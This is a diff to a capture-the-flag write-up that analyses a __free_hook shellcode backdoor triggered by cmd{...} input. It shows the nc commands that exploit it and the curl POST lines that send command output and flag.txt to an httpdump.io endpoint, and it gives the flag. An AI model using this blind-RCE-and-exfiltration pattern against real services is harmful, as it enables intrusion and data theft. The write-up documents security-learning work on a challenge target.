@@ -312,22 +312,25 @@ r2 -a x86 -b 64 -qc pd shellcode_unpatched.bin
             0x000000c8      c3             ret
 ```
 
-## todo: analyzse shellcode
-bla - substitutions
+## Analyze Shellcode
+The commented shellcode disassembly pretty much sums the major functionality up.
+1. Check if malloc_usable_size() returns a value > 5 (otherwise there can't be a string inside cmd{})
+2. Verify if the memory buffer to be freed begins with cmd{
+3. Create a null-terminated string comprising the chars inside cmd{...}
+4. Call system() with that string (this is the remote code execution)
+5. Do the normal free'ing afterwards (*interesting: for the time of calling system, the __free_hook hook is disabled and enabled again afterwards*).
 
-shellcode calls malloc_usable_size first, exits if <5 bytes
-checks rdi (param to __free_hook), does it point to a buffer that starts with cmd{?
-if so, let rbx point to the command inside {}
+Now we know the trigger for the code execution in backdoored processes: put cmd{*command*} into a memory buffer, e.g. by using this for input.
 
-call system with string param pointed to by rbx (the rce command)
-
-## todo: verify backdoor in local image
-test sshd/nginx processes in qemu image for having been injected
+## Verify Backdoor/RCE in Local Image
+Assumption: The sshd/nginx process in the qemu image might have been backdoored with the injector.sh script.
+Test with nginx listening on tcp port 4321:
 ```
 nc 0 4321
 cmd{echo bla > /tmp/bla}
 ```
 
+Check if a file named /tmp/bla has been written?
 ```
 root@injector-local:/tmp# ls -la
 total 48
@@ -335,15 +338,19 @@ drwxrwxrwt 11 root     root     4096 Jan 21 22:20 .
 drwxr-xr-x 19 root     root     4096 Dec 21 16:20 ..
 -rw-rw-rw-  1 www-data www-data    4 Jan 21 22:20 bla
 ```
--> seems like nginx has been injected with the shellcode
 
-## todo: it's a blind rce
-set up a http endpoint at httpdump.io
+This proves that the backdoor shellcode has at least been placed into nginx in the local qemu image!
+There is one additional obstacle to climb over though: There is no echoing back of the system() output, making this a **blind remote code execution (RCE)**.
+
+## How to Redirect RCE Output
+There are different ways to redirect the RCE output to a listener under your control. One could be a netcat listener on a public routable IP address. In case you are missing one (due to NAT), you could set up a temporary HTTP endpoint at httpdump.io.
+For this CTF, i used https://httpdump.io/hwie_
 ```
 nc injector.challenges.adversary.zone 4321
 cmd{ls -l | curl -X POST --data-binary @- https://httpdump.io/hwie_}
 ```
-yields
+
+This yields:
 ```
 total 64
 lrwxrwxrwx   1 root root     7 Oct 22 13:58 bin -> usr/bin
@@ -373,10 +380,13 @@ drwxr-xr-x  14 root root  4096 Oct 22 13:58 usr
 drwxr-xr-x  13 root root  4096 Dec 30 18:16 var
 ```
 
-## todo: flag
+## Now it's Flag Time!
 ```
 nc injector.challenges.adversary.zone 4321
 cmd{cat flag.txt | curl -X POST --data-binary @- https://httpdump.io/hwie_}
 ```
-Flag: CS{fr33_h00k_b4ckd00r}
+Flag: **CS{fr33_h00k_b4ckd00r}**
 
+## Conclusion
+This challenge has been a great learning experience, comprising different aspects of cyber security offense and defense.
+The backdoor is triggered through normal network services and their listening ports. There is no extra listen port, no seperate backdoor process running.
